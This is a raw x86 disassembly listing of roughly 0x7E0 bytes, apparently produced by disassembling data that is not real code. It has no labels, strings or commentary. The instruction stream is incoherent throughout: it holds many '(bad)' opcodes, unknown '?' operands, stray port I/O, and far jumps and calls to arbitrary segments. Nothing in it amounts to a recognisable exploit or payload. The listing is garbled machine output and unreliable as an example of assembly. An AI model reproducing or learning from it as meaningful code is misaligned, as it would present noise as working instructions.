  42143f:	mov    ds:0x944297ae,al
  421444:	lds    ebx,FWORD PTR [edx+0x32597862]
  42144a:	ss je  0x4214c3
  42144d:	(bad)  
  42144f:	mov    ch,0xda
  421451:	inc    edi
  421452:	ds mov esi,0x4beb7455
  421458:	xchg   edi,eax
  421459:	mov    ch,0x63
  42145b:	push   cs
  42145c:	ins    BYTE PTR es:[edi],dx
  42145d:	mul    BYTE PTR [edx]
  42145f:	mov    edx,edi
  421461:	sahf   
  421462:	jmp    FWORD PTR [ecx]
  421464:	shr    BYTE PTR [ebx-0x27c82121],cl
  42146a:	dec    ebx
  42146b:	pop    eax
  42146c:	lock lods al,BYTE PTR ds:[esi]
  42146e:	xchg   esi,eax
  42146f:	loopne 0x4214a5
  421471:	jge    0x42148a
  421473:	in     al,dx
  421474:	aam    0x82
  421476:	out    dx,eax
  421477:	call   0xb8a756c4
  42147c:	fwait
  42147d:	sbb    DWORD PTR [ecx-0x324c924],edx
  421483:	fsub   DWORD PTR [ecx]
  421485:	leave  
  421486:	xor    esp,DWORD PTR [edi]
  421488:	cmc    
  421489:	xchg   edx,eax
  42148a:	xor    BYTE PTR ds:0x374ccfd6,dl
  421490:	push   edi
  421491:	hlt    
  421492:	mov    ebp,0xb89bb300
  421497:	dec    edx
  421498:	aad    0x55
  42149a:	fld    st(3)
  42149c:	fmul   QWORD PTR cs:[ecx+eax*4]
  4214a0:	jns    0x4214d1
  4214a2:	jle    0x4214e7
  4214a4:	icebp  
  4214a5:	sub    al,0x7
  4214a7:	cmp    ebx,ebp
  4214a9:	push   esp
  4214aa:	sti    
  4214ab:	int    0x9a
  4214ad:	sub    BYTE PTR [eax],dl
  4214af:	inc    esp
  4214b0:	in     al,dx
  4214b1:	pop    esi
  4214b2:	(bad)  
  4214b3:	(bad)  
  4214b4:	(bad)  
  4214b6:	clc    
  4214b7:	xchg   esi,eax
  4214b8:	sbb    eax,0x86271e4c
  4214bd:	scas   al,BYTE PTR es:[edi]
  4214be:	call   FWORD PTR [edi+0x220efa7a]
  4214c4:	dec    eax
  4214c5:	aas    
  4214c6:	fild   QWORD PTR [ebx+ecx*1+0x1a6ffc2e]
  4214cd:	mov    ah,BYTE PTR [ecx+0x63]
  4214d0:	cmp    eax,0x19e9feb9
  4214d5:	nop
  4214d6:	jmp    0x356f:0x98690e9e
  4214dd:	adc    cl,dl
  4214df:	mov    dl,0x52
  4214e1:	jbe    0x421513
  4214e3:	clc    
  4214e4:	test   DWORD PTR [ebx],edx
  4214e6:	scas   al,BYTE PTR es:[edi]
  4214e7:	repz aas 
  4214e9:	jle    0x4214a9
  4214eb:	add    DWORD PTR [edi+ebx*4+0x5cb12110],edi
  4214f2:	enter  0xe046,0x37
  4214f6:	pop    ebx
  4214f7:	fnstenv [eax]
  4214f9:	sub    al,0x98
  4214fb:	jne    0x421533
  4214fd:	xor    ebx,DWORD PTR [ebx+0x6a23fc78]
  421503:	mov    ah,0xfd
  421505:	dec    ecx
  421506:	xor    al,0x7a
  421508:	inc    edi
  421509:	sahf   
  42150a:	xchg   BYTE PTR [edi-0x12b8832c],ah
  421510:	out    dx,al
  421511:	imul   ebp,DWORD PTR [edx],0xffffffc9
  421514:	push   es
  421515:	inc    edi
  421516:	and    ch,BYTE PTR [eax-0x62687f6e]
  42151c:	mov    edx,0x177042bd
  421521:	or     BYTE PTR [esi-0x695e521c],0x13
  421528:	mov    esp,0xffe9e1f7
  42152d:	jecxz  0x4214de
  42152f:	mov    ds:0x858f737b,eax
  421534:	jns    0x42154d
  421536:	nop
  421537:	jle    0x4214b9
  421539:	iret   
  42153a:	or     bl,bl
  42153c:	sbb    edx,DWORD PTR [esi]
  42153e:	rcl    BYTE PTR [ebp+edi*8+0x14],0xc3
  421543:	pop    edx
  421544:	out    dx,al
  421545:	sbb    BYTE PTR [ecx-0x61],dh
  421548:	hlt    
  421549:	adc    esi,DWORD PTR [esi+0x762abd30]
  42154f:	xor    DWORD PTR [ebp+0x8],edx
  421552:	pop    ebx
  421553:	aaa    
  421554:	sub    BYTE PTR [ebp+0x19],bl
  421557:	cmp    DWORD PTR [edi+0x7e],0x2e8b0fde
  42155e:	scas   al,BYTE PTR es:[edi]
  42155f:	inc    ebx
  421560:	in     eax,dx
  421561:	out    dx,eax
  421562:	fistp  DWORD PTR [edx-0x7fc2042f]
  421568:	pop    esp
  421569:	mov    dl,0x22
  42156b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42156c:	in     al,0xc3
  42156e:	(bad)  
  42156f:	ja     0x4215be
  421571:	push   ebx
  421572:	addr16 out 0x50,eax
  421575:	pop    edi
  421576:	sbb    al,0xe1
  421578:	icebp  
  421579:	mov    fs,WORD PTR [edi]
  42157b:	xchg   ebp,eax
  42157c:	cwde   
  42157d:	mov    ch,0x8e
  42157f:	or     ecx,esi
  421581:	outs   dx,BYTE PTR ds:[esi]
  421582:	icebp  
  421583:	mov    ch,0x27
  421585:	std    
  421586:	xchg   ebp,eax
  421587:	xchg   esi,eax
  421588:	mov    ds:0xd62118a8,eax
  42158d:	test   ecx,edi
  42158f:	sbb    al,0x95
  421591:	add    eax,0xe33d058a
  421596:	stos   BYTE PTR es:[edi],al
  421597:	mov    ebx,0x92066a11
  42159c:	mov    dh,0x31
  42159e:	lods   eax,DWORD PTR ds:[esi]
  42159f:	cmc    
  4215a0:	data16 mov bh,0xc3
  4215a3:	mov    dl,0x20
  4215a5:	shl    DWORD PTR [ebx+edi*1],0xc1
  4215a9:	bound  esi,QWORD PTR [ebp-0x77]
  4215ac:	pop    esi
  4215ad:	pop    edi
  4215ae:	enter  0x88fa,0xf1
  4215b2:	adc    ecx,DWORD PTR [eax]
  4215b4:	mov    ds:0x1ef5ca27,eax
  4215b9:	inc    eax
  4215ba:	mov    ecx,0x98856c1
  4215bf:	jbe    0x421559
  4215c1:	sahf   
  4215c2:	xlat   BYTE PTR ds:[ebx]
  4215c3:	imul   edi,ebx,0x5d
  4215c6:	inc    esp
  4215c7:	(bad)  
  4215c8:	call   0x53f0:0x837d56b2
  4215cf:	ja     0x421562
  4215d1:	and    DWORD PTR [esi+0x33a33f73],ebx
  4215d7:	jae    0x4215a3
  4215d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215da:	call   0xaf54e61f
  4215df:	leave  
  4215e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215e1:	pop    ds
  4215e2:	mov    ebp,0xaedfa7a0
  4215e7:	sub    eax,0xcb48ab5d
  4215ec:	stc    
  4215ed:	push   es
  4215ee:	mov    esi,0xe6e66d36
  4215f3:	pop    esi
  4215f4:	sub    al,0x76
  4215f6:	xor    bl,BYTE PTR [edi+0x47]
  4215f9:	(bad)  
  4215fa:	rcr    BYTE PTR [eax],cl
  4215fc:	sar    DWORD PTR [ebx+edx*8],0x8a
  421600:	cli    
  421601:	mov    edi,0x6c6a1ec8
  421606:	lahf   
  421607:	cmp    eax,0x2ba2fb58
  42160c:	jo     0x4215e9
  42160e:	pop    ds
  42160f:	xlat   BYTE PTR ds:[ebx]
  421610:	call   0x8614:0x9e9b299f
  421617:	mov    DWORD PTR [edx],ecx
  421619:	pop    esp
  42161a:	jbe    0x42167a
  42161c:	sub    dl,BYTE PTR [edi+eax*1]
  42161f:	ret    0x5e57
  421622:	mov    dl,0x95
  421624:	cmp    ebx,DWORD PTR [ecx-0x1d]
  421627:	pop    ebx
  421628:	cmp    bl,BYTE PTR [edi-0x349a1e87]
  42162e:	cmp    ecx,ebx
  421630:	sti    
  421631:	loopne 0x42162b
  421633:	sti    
  421634:	jno    0x42167e
  421636:	pop    eax
  421637:	cwde   
  421638:	ret    0xfc09
  42163b:	inc    ebp
  42163c:	or     al,0x9f
  42163e:	addr16 clc 
  421640:	jne    0x421679
  421642:	mov    ds:0x37e4997,al
  421647:	xlat   BYTE PTR ds:[ebx]
  421648:	cmc    
  421649:	and    edi,DWORD PTR [eax+ecx*4-0x25]
  42164d:	add    al,0xa0
  42164f:	mov    esi,0x9c28a38e
  421654:	lea    esi,[edx-0x2f742dc3]
  42165a:	retf   0x520a
  42165d:	cmp    eax,0x4ae80500
  421662:	sub    DWORD PTR [eax-0x5008f182],ebx
  421668:	sbb    cl,0x3b
  42166b:	fcom   DWORD PTR [edi]
  42166d:	xor    DWORD PTR [ecx+0x319f3420],ecx
  421673:	or     BYTE PTR [edi-0x66703f98],cl
  421679:	outs   dx,DWORD PTR ds:[esi]
  42167a:	(bad)
  42167e:	pop    es
  42167f:	test   BYTE PTR [esi+0x6a],dl
  421682:	push   eax
  421683:	sub    BYTE PTR [ebp-0x2b09e883],bh
  421689:	dec    ecx
  42168a:	in     eax,0x17
  42168c:	adc    eax,0x519b7408
  421691:	add    BYTE PTR [esi],0xae
  421694:	(bad)  
  421695:	xchg   esi,eax
  421696:	inc    esi
  421697:	std    
  421698:	inc    edx
  421699:	repz into 
  42169b:	xor    ebp,DWORD PTR [ecx-0xf9c1efd]
  4216a1:	pop    ds
  4216a2:	fwait
  4216a3:	push   ebx
  4216a4:	loope  0x4216c1
  4216a6:	mov    cl,0xb9
  4216a8:	adc    al,0x7d
  4216aa:	mov    ch,0xaa
  4216ac:	xchg   esi,eax
  4216ad:	aad    0x99
  4216af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216b0:	icebp  
  4216b1:	mov    ecx,0x2fdd64fb
  4216b6:	sbb    BYTE PTR [ecx+0x786120eb],dl
  4216bc:	jle    0x4216cd
  4216be:	jle    0x421731
  4216c0:	out    dx,al
  4216c1:	(bad)  
  4216c2:	jmp    0x8691:0x5cae74e7
  4216c9:	call   0xab68dc6a
  4216ce:	call   0xd5585808
  4216d3:	mov    eax,ds:0xcd64c341
  4216d8:	and    DWORD PTR [ebx+0x15de3a9d],ecx
  4216de:	jge    0x421731
  4216e0:	outs   dx,DWORD PTR ds:[esi]
  4216e1:	adc    DWORD PTR [ebp+esi*1-0x50ff7ad],ebx
  4216e8:	mov    ch,0x9c
  4216ea:	fst    DWORD PTR [edx-0x428d0abf]
  4216f0:	outs   dx,BYTE PTR ds:[esi]
  4216f1:	sub    al,0xa7
  4216f3:	retf   
  4216f4:	(bad)
  4216f8:	in     eax,0x41
  4216fa:	cmp    eax,0xa7a44c7c
  4216ff:	aad    0xbf
  421701:	mov    eax,ds:0xbd664760
  421706:	xor    al,0x94
  421708:	or     eax,0x28386ad2
  42170d:	mov    bh,0x77
  42170f:	shl    BYTE PTR [esi+0x17],cl
  421712:	test   DWORD PTR [esp+edi*1+0x9ce4c47],esp
  421719:	and    DWORD PTR [ebx+eiz*1+0x5b1ec00b],edx
  421720:	push   ebx
  421721:	xor    edx,DWORD PTR [edx-0x32]
  421724:	imul   ebp,eax,0x907023bd
  42172a:	or     eax,0xfd6cc1e6
  42172f:	pusha  
  421730:	dec    ebx
  421731:	sbb    eax,DWORD PTR [ecx-0x5f6ccdbf]
  421737:	scas   eax,DWORD PTR es:[edi]
  421738:	mov    bh,BYTE PTR [esi]
  42173a:	dec    edx
  42173b:	cdq    
  42173c:	in     al,0x0
  42173e:	and    al,0x1b
  421740:	mov    ebx,0xc99d6129
  421745:	dec    ebp
  421746:	lds    ecx,FWORD PTR [edi-0x2fffff73]
  42174c:	dec    ecx
  42174d:	repnz (bad) 
  42174f:	(bad)  [eax+ebp*8]
  421752:	push   0xffffff8f
  421754:	xchg   esp,eax
  421755:	pmaddwd mm6,QWORD PTR [ecx-0x4e]
  421759:	xchg   esp,eax
  42175a:	into   
  42175b:	gs dec edx
  42175d:	cmp    eax,0x24ee8e7e
  421762:	push   0xfffffff8
  421764:	add    eax,0x5464c8c7
  421769:	cmc    
  42176a:	mov    ch,0xfa
  42176c:	lds    edi,FWORD PTR [ecx]
  42176e:	lods   al,BYTE PTR ds:[esi]
  42176f:	pop    esp
  421770:	push   edi
  421771:	sbb    BYTE PTR [edi+0x794fe80b],cl
  421777:	or     eax,0x1d4f26c5
  42177c:	rol    DWORD PTR [ebx],0x5e
  42177f:	call   0x4e14:0x4d21c831
  421786:	hlt    
  421787:	aad    0x19
  421789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42178a:	dec    cx
  42178c:	(bad)  
  42178d:	int3   
  42178e:	inc    ecx
  42178f:	pop    eax
  421790:	sub    al,0xcd
  421792:	push   es
  421793:	ja     0x421771
  421795:	ret    0x23e9
  421798:	stc    
  421799:	call   0xae1b17cb
  42179e:	or     BYTE PTR [esi+0x3eba3ffb],al
  4217a4:	adc    DWORD PTR [eax-0x6c],esp
  4217a7:	dec    esi
  4217a8:	sub    ebx,DWORD PTR [ebp+0xc7ca63b]
  4217ae:	mov    esi,0xc55cf5d6
  4217b3:	mov    bh,0xb1
  4217b5:	out    dx,eax
  4217b6:	lds    eax,FWORD PTR [edi]
  4217b8:	mov    ebp,0xccedfc5b
  4217bd:	cmc    
  4217be:	in     al,dx
  4217bf:	call   0xc9bd:0xdedbb976
  4217c6:	mov    cl,0x57
  4217c8:	mov    dh,0xb3
  4217ca:	mov    al,0xef
  4217cc:	repz dec ecx
  4217ce:	xchg   ecx,eax
  4217cf:	int3   
  4217d0:	stos   BYTE PTR es:[edi],al
  4217d1:	sbb    eax,0x6d664dc3
  4217d6:	lock lds esp,FWORD PTR [edx+esi*1-0xb1be191]
  4217de:	repz lock lahf 
  4217e1:	ds pop ebp
  4217e3:	ins    DWORD PTR es:[edi],dx
  4217e4:	jp     0x421826
  4217e6:	pushf  
  4217e7:	cmp    al,0xb2
  4217e9:	jmp    0x3e92fd0
  4217ee:	out    0x5a,al
  4217f0:	xor    ecx,ebx
  4217f2:	btc    DWORD PTR [edi+0x56442cbf],ebx
  4217f9:	xchg   DWORD PTR [ebx],edx
  4217fb:	std    
  4217fc:	ror    DWORD PTR [eax+0x6219e468],1
  421802:	sti    
  421803:	xchg   esi,eax
  421804:	data16 into 
  421806:	cs mov al,0x19
  421809:	in     eax,0xbc
  42180b:	mov    edi,DWORD PTR [eax]
  42180d:	xor    DWORD PTR [esi+0x39344c49],esp
  421813:	xchg   edi,eax
  421814:	loop   0x4217bd
  421816:	dec    ebx
  421817:	scas   eax,DWORD PTR es:[edi]
  421818:	mov    eax,ds:0xd05b3608
  42181d:	leave  
  42181e:	in     eax,dx
  42181f:	cs (bad) 
  421821:	aam    0x6d
  421823:	test   BYTE PTR [edx],cl
  421825:	div    BYTE PTR [edx-0x56c3a86a]
  42182b:	(bad)  
  42182c:	and    esp,ecx
  42182e:	and    DWORD PTR [ebx+0x38],edi
  421831:	(bad)  
  421832:	hlt    
  421833:	fnstcw WORD PTR [edx-0x1130697b]
  421839:	cwde   
  42183a:	inc    DWORD PTR [esi-0x24]
  42183d:	or     al,0x3c
  42183f:	scas   al,BYTE PTR es:[edi]
  421840:	arpl   di,si
  421842:	test   DWORD PTR [edx],edi
  421844:	add    edi,DWORD PTR [ecx-0x4c9362d0]
  42184a:	and    ah,BYTE PTR [ebx+edx*2]
  42184d:	xor    DWORD PTR [eax-0x7b],ecx
  421850:	mov    al,ds:0x3ab8c81e
  421855:	mov    ch,0x5f
  421857:	js     0x421897
  421859:	jo     0x421862
  42185b:	inc    ecx
  42185c:	xor    ecx,DWORD PTR [ecx-0x80]
  42185f:	hlt    
  421860:	mov    DWORD PTR [ecx],esi
  421862:	std    
  421863:	pushf  
  421864:	sub    esp,ebp
  421866:	rcr    DWORD PTR [ecx-0x1],1
  421869:	dec    ebp
  42186a:	sbb    DWORD PTR [ebp-0x3b],0xffffff8d
  42186e:	mov    ah,0x78
  421870:	aad    0x3f
  421872:	jge    0x4218b2
  421874:	scas   al,BYTE PTR es:[edi]
  421875:	push   es
  421876:	pop    ebx
  421877:	sbb    al,BYTE PTR [edx+eax*1+0xd]
  42187b:	loope  0x4218a4
  42187d:	cmp    ch,BYTE PTR [edx+eiz*2-0x4a]
  421881:	inc    ecx
  421882:	push   esi
  421883:	fs adc ebp,ecx
  421886:	mov    ds:0x795b2145,eax
  42188b:	jp     0x421871
  42188d:	add    dh,BYTE PTR [ebp-0x6c]
  421890:	mov    eax,0xf686bdac
  421895:	mov    dl,0xfd
  421897:	sbb    bh,0x33
  42189a:	lds    edx,FWORD PTR ds:0x315e42c6
  4218a0:	fst    QWORD PTR [ecx]
  4218a2:	jmp    0x4f92d683
  4218a7:	lahf   
  4218a8:	popf   
  4218a9:	cmp    DWORD PTR ds:0x79eebd5b,0x10058b5b
  4218b3:	enter  0xfed6,0xe6
  4218b7:	push   ecx
  4218b8:	loop   0x4218e3
  4218ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218bb:	(bad)  
  4218bc:	pop    ebp
  4218bd:	sahf   
  4218be:	aad    0xe
  4218c0:	hlt    
  4218c1:	inc    edx
  4218c2:	mov    eax,0xc72de36
  4218c7:	mov    bh,0x3
  4218c9:	aad    0xdb
  4218cb:	sbb    bh,0xdf
  4218ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218cf:	jne    0x421875
  4218d1:	jns    0x4218ae
  4218d3:	call   0x6e0acc27
  4218d8:	jne    0x421865
  4218da:	dec    edi
  4218db:	sbb    BYTE PTR [ebp+0x37],0x38
  4218df:	jmp    DWORD PTR [ecx+0x161265ed]
  4218e5:	cmp    BYTE PTR [esp+ebp*2+0x8],0x8
  4218ea:	or     dh,cl
  4218ec:	xchg   edi,eax
  4218ed:	xor    al,0x2
  4218ef:	mov    esi,0xb9be8652
  4218f4:	ss test eax,0x4b3e636b
  4218fa:	jno    0x421914
  4218fc:	rol    DWORD PTR [edx],1
  4218fe:	enter  0x6f5f,0x89
  421902:	popa   
  421903:	sub    ecx,edx
  421905:	mov    ecx,0x9a766487
  42190a:	ins    DWORD PTR es:[edi],dx
  42190b:	pushf  
  42190c:	sub    bl,BYTE PTR [edi*2+0x12e78096]
  421913:	jmp    DWORD PTR [esi]
  421915:	movhps xmm1,QWORD PTR [edi]
  421918:	out    0x5d,al
  42191a:	(bad)  
  42191b:	jno    0x421957
  42191d:	imul   edx,DWORD PTR [ecx-0x4b328c84],0xe0edd701
  421927:	jl     0x42190d
  421929:	push   ds
  42192a:	cmp    BYTE PTR [edx+0x2b],dl
  42192d:	inc    ebp
  42192e:	imul   ebx,DWORD PTR [edi],0xfcfb2fa
  421934:	iret   
  421935:	inc    edx
  421936:	pusha  
  421937:	push   es
  421938:	xor    cl,al
  42193a:	adc    al,0x19
  42193c:	retf   0x1273
  42193f:	lea    eax,[ecx+0x60]
  421942:	fimul  DWORD PTR [ebx+0x383403e4]
  421948:	dec    ecx
  421949:	sub    al,0xfe
  42194b:	(bad)  
  42194c:	arpl   WORD PTR [ecx+0xf5a0c91],dx
  421952:	sbb    al,0xd
  421954:	cmc    
  421955:	push   ecx
  421956:	dec    edx
  421957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421958:	in     eax,dx
  421959:	dec    esi
  42195a:	xor    BYTE PTR [ebx+0x14bd7030],al
  421960:	dec    ebx
  421961:	pop    eax
  421962:	dec    edx
  421963:	xlat   BYTE PTR ds:[ebx]
  421964:	pusha  
  421965:	inc    esp
  421966:	add    al,BYTE PTR [eax-0x48259976]
  42196c:	jb     0x4219be
  42196e:	cmp    al,0x9c
  421970:	and    bl,BYTE PTR [edi+0x58]
  421973:	xchg   esp,eax
  421974:	mov    ?,WORD PTR [edi-0x3e2f184b]
  42197a:	sub    al,0xde
  42197c:	cmp    al,0xf5
  42197e:	int    0x86
  421980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421981:	inc    ebx
  421982:	sbb    BYTE PTR [ebp+0x59],0xec
  421986:	sar    DWORD PTR [edi],cl
  421988:	inc    DWORD PTR [edi]
  42198a:	sub    DWORD PTR [ecx],eax
  42198c:	bound  ebx,QWORD PTR [ebp+0x4096dfb7]
  421992:	add    esi,DWORD PTR [eax-0x4c]
  421995:	aad    0x34
  421997:	cmp    ah,BYTE PTR [esi+0x4cc40775]
  42199d:	add    bh,BYTE PTR [esi-0x18]
  4219a0:	xor    ecx,DWORD PTR [eax+0x1628411]
  4219a6:	mov    ds:0x95dec264,al
  4219ab:	xchg   edx,eax
  4219ac:	ficom  WORD PTR [ecx]
  4219ae:	aad    0xff
  4219b0:	cld    
  4219b1:	(bad)  
  4219b2:	js     0x421951
  4219b4:	enter  0xea1f,0xe9
  4219b8:	sub    al,0x2c
  4219ba:	jb     0x4219f8
  4219bc:	imul   ecx,DWORD PTR [eax+0x17],0xffffffe0
  4219c0:	jne    0x421950
  4219c2:	push   esp
  4219c3:	dec    esp
  4219c4:	dec    ebx
  4219c5:	jp     0x42199e
  4219c7:	sbb    ah,bh
  4219c9:	mov    ch,0xd9
  4219cb:	pop    ss
  4219cc:	xchg   edi,eax
  4219cd:	sub    al,0x3f
  4219cf:	push   ss
  4219d0:	and    eax,0x9d715c64
  4219d5:	push   cs
  4219d6:	cmp    ebx,DWORD PTR [edx-0x1d]
  4219d9:	sbb    eax,0x14ff4f9
  4219de:	imul   eax,edx,0xffffff82
  4219e1:	pop    ebp
  4219e2:	xchg   edx,eax
  4219e3:	and    eax,0x7ab43212
  4219e8:	std    
  4219e9:	aam    0xcd
  4219eb:	mov    WORD PTR [eax],?
  4219ed:	xchg   edx,eax
  4219ee:	stos   BYTE PTR es:[edi],al
  4219ef:	jmp    0x3b0e:0xe495008
  4219f6:	mov    esi,DWORD PTR [edi]
  4219f8:	or     esi,DWORD PTR [esi+esi*1+0x10]
  4219fc:	shl    DWORD PTR [ebx+0x15649783],0x17
  421a03:	jmp    0xf3c4:0xe6fa31f0
  421a0a:	push   esp
  421a0b:	add    edx,DWORD PTR [ebx-0x63]
  421a0e:	sub    BYTE PTR [ebx],bl
  421a10:	stos   DWORD PTR es:[edi],eax
  421a11:	or     ebp,ebx
  421a13:	add    BYTE PTR [ebx+0x37],cl
  421a16:	dec    esp
  421a17:	int    0x9d
  421a19:	inc    ecx
  421a1a:	fwait
  421a1b:	cmp    DWORD PTR [edx],0xc409e35
  421a21:	inc    ebp
  421a22:	ins    DWORD PTR es:[edi],dx
  421a23:	dec    eax
  421a24:	push   DWORD PTR [eax+eax*1]
  421a27:	js     0x421a78
  421a29:	and    al,0xcd
  421a2b:	hlt    
  421a2c:	mov    esp,0x540ead6c
  421a31:	mov    ds:0x292e1731,al
  421a36:	jmp    0x7509:0x39fd0e93
  421a3d:	fdiv   st,st(4)
  421a3f:	cs sub al,0xd5
  421a42:	test   eax,0x4131f5b5
  421a47:	aam    0x91
  421a49:	add    DWORD PTR ds:0x27009ba4,ebx
  421a4f:	add    al,0xc4
  421a51:	paddb  mm7,QWORD PTR [ebp-0x49]
  421a55:	lds    ebp,FWORD PTR [esi-0x7d25a840]
  421a5b:	adc    eax,0x6b7d114e
  421a60:	jo     0x4219fd
  421a62:	rcl    BYTE PTR [ebx+0x3a647b39],1
  421a68:	in     eax,dx
  421a69:	adc    al,0xe7
  421a6b:	aas    
  421a6c:	mov    dh,0x89
  421a6e:	aad    0x30
  421a70:	je     0x421a61
  421a72:	jl     0x421ac4
  421a74:	or     bl,BYTE PTR [edi-0x4147d49b]
  421a7a:	xor    dh,BYTE PTR [esi+0x51]
  421a7d:	inc    eax
  421a7e:	hlt    
  421a7f:	sub    al,0xab
  421a81:	loopne 0x421a5b
  421a83:	sbb    al,0xba
  421a85:	jne    0x421ae7
  421a87:	and    DWORD PTR [ebp+0xfbf5a9],0x96773782
  421a91:	icebp  
  421a92:	je     0x421af4
  421a94:	fisttp QWORD PTR [esi+0x34]
  421a97:	cmp    al,0x75
  421a99:	add    eax,0xacc6e33f
  421a9e:	push   ss
  421a9f:	sbb    al,0x78
  421aa1:	dec    edi
  421aa2:	jl     0x421a6e
  421aa4:	mov    ecx,0xc0fc9c1c
  421aa9:	stc    
  421aaa:	sti    
  421aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aac:	cld    
  421aad:	repz mov bl,BYTE PTR [ebx+ecx*1]
  421ab1:	mov    eax,0xb5f8ce6b
  421ab6:	out    0x89,eax
  421ab8:	mov    es,WORD PTR [ebp+0x37]
  421abb:	lds    ebx,FWORD PTR ds:0x67c08b2
  421ac1:	out    0x61,al
  421ac3:	sbb    edi,DWORD PTR [esi+0x7]
  421ac6:	and    dl,BYTE PTR ds:0x9e76111c
  421acc:	pop    esi
  421acd:	push   cs
  421ace:	ror    DWORD PTR [edi+0x4d46b84f],1
  421ad4:	push   ecx
  421ad5:	(bad)  
  421ad6:	push   edx
  421ad7:	clc    
  421ad8:	ret    0xc346
  421adb:	cli    
  421adc:	sub    bh,bl
  421ade:	dec    esi
  421adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ae0:	lock or dh,cl
  421ae3:	cmp    ah,dl
  421ae5:	lahf   
  421ae6:	and    ecx,0xffffffbb
  421ae9:	adc    al,0xd6
  421aeb:	call   0x96b7cf57
  421af0:	cmp    esi,DWORD PTR [edi+edi*2-0x62]
  421af4:	push   eax
  421af5:	ret    
  421af6:	fnstcw WORD PTR [esi]
  421af8:	mov    ds:0x75a1629d,eax
  421afe:	sbb    eax,0xb9957357
  421b03:	fcmovu st,st(6)
  421b05:	(bad)  
  421b06:	daa    
  421b07:	push   es
  421b08:	cli    
  421b09:	dec    edx
  421b0a:	je     0x421abd
  421b0c:	cmp    eax,0x18cdeb9a
  421b11:	sub    eax,0x9d4b255
  421b16:	and    DWORD PTR [ebp+eiz*8+0x7d],ebp
  421b1a:	inc    ecx
  421b1b:	jne    0x421b08
  421b1d:	sbb    cl,BYTE PTR [ebx+eax*2]
  421b20:	sti    
  421b21:	xchg   ebx,eax
  421b22:	fisttp WORD PTR [ecx]
  421b24:	jmp    0x421ae8
  421b26:	daa    
  421b27:	in     al,dx
  421b28:	adc    esi,0x7a
  421b2b:	mov    ds:0x2b7ecef2,eax
  421b30:	aaa    
  421b31:	lea    esp,[ecx+0x3d5bf81a]
  421b37:	or     esp,esp
  421b39:	imul   esi,edi,0x4e4585c6
  421b3f:	jmp    0x421bb1
  421b41:	stos   DWORD PTR es:[edi],eax
  421b42:	retf   
  421b43:	sbb    DWORD PTR [ecx],eax
  421b45:	(bad)  
  421b46:	stos   DWORD PTR es:[edi],eax
  421b47:	mov    DWORD PTR [esi],edi
  421b49:	pop    esp
  421b4a:	je     0x421acc
  421b4c:	cmp    al,0xc4
  421b4e:	(bad)  
  421b4f:	popf   
  421b50:	int    0x8f
  421b52:	or     edi,DWORD PTR [ecx]
  421b54:	xor    DWORD PTR [esi],eax
  421b56:	lods   al,BYTE PTR ds:[esi]
  421b57:	push   ds
  421b58:	or     DWORD PTR [ecx-0xb],esi
  421b5b:	dec    eax
  421b5c:	or     al,0xbe
  421b5e:	and    dh,BYTE PTR [ecx+0x2]
  421b61:	cld    
  421b62:	mov    eax,ds:0xb00cc983
  421b67:	enter  0xa533,0xb7
  421b6b:	mov    eax,ds:0xbae9493d
  421b70:	call   0x3e7c:0xdaae558
  421b77:	pop    ebx
  421b78:	mov    bl,0x33
  421b7a:	jmp    0x421b33
  421b7c:	jns    0x421b8c
  421b7e:	xchg   esp,eax
  421b7f:	add    eax,0xdb851906
  421b84:	push   eax
  421b85:	ret    
  421b86:	fldenv [eax+0x65e1dfbb]
  421b8c:	xchg   DWORD PTR [esi-0x5131c0a6],ecx
  421b92:	iret   
  421b93:	xor    eax,DWORD PTR [ecx+0x18]
  421b96:	(bad)  
  421b97:	hlt    
  421b98:	(bad)  
  421b99:	xlat   BYTE PTR ds:[ebx]
  421b9a:	lock push eax
  421b9c:	repnz repz fistp DWORD PTR [ecx]
  421ba0:	lods   al,BYTE PTR ds:[esi]
  421ba1:	in     eax,0xf5
  421ba3:	jne    0x421b7e
  421ba5:	inc    esi
  421ba6:	inc    ecx
  421ba7:	sub    BYTE PTR ds:0xdb5aad71,ah
  421bad:	dec    edi
  421bae:	xchg   DWORD PTR [esi+0xada0828],ecx
  421bb4:	inc    ebx
  421bb5:	sub    ah,BYTE PTR [eax-0x60]
  421bb8:	mov    esi,0xf3c477d9
  421bbd:	xlat   BYTE PTR ds:[ebx]
  421bbe:	sub    esi,DWORD PTR [edi-0x7373c940]
  421bc4:	lods   al,BYTE PTR ds:[esi]
  421bc5:	mov    dl,0x5c
  421bc7:	mov    ds:0xad96b26d,eax
  421bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bcd:	add    ebp,DWORD PTR ds:0x1a6e9e5d
  421bd3:	out    dx,al
  421bd4:	call   0xb6802571
  421bd9:	cmp    DWORD PTR [ecx-0xa5da3f],edi
  421bdf:	outs   dx,BYTE PTR ds:[esi]
  421be0:	cmp    DWORD PTR [esi+0x69],ebp
  421be3:	ds int 0x4b
  421be6:	ins    DWORD PTR es:[edi],dx
  421be7:	inc    esp
  421be8:	push   0x11330cdc
  421bed:	xchg   BYTE PTR [ebp-0x37],bl
  421bf0:	in     eax,dx
  421bf1:	bound  ebx,QWORD PTR [edx+edx*1-0x58]
  421bf5:	mov    al,ds:0x534dc308
  421bfa:	dec    eax
  421bfb:	sahf   
  421bfc:	and    ch,bl
  421bfe:	mov    cl,0xcc
  421c00:	fisubr DWORD PTR [esi-0x78fd5b17]
  421c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c07:	stos   DWORD PTR es:[edi],eax
  421c08:	add    edx,DWORD PTR [esi+0x4e430c4]
  421c0e:	add    bl,BYTE PTR [edi-0x49]
  421c11:	popf   
  421c12:	pop    ebx
  421c13:	sub    esi,DWORD PTR [esi+eax*4]
  421c16:	mov    cl,0xa4
  421c18:	push   0xd562ec8c
  421c1d:	outs   dx,BYTE PTR ds:[esi]
  421c1e:	mov    ecx,0xbc498bf9
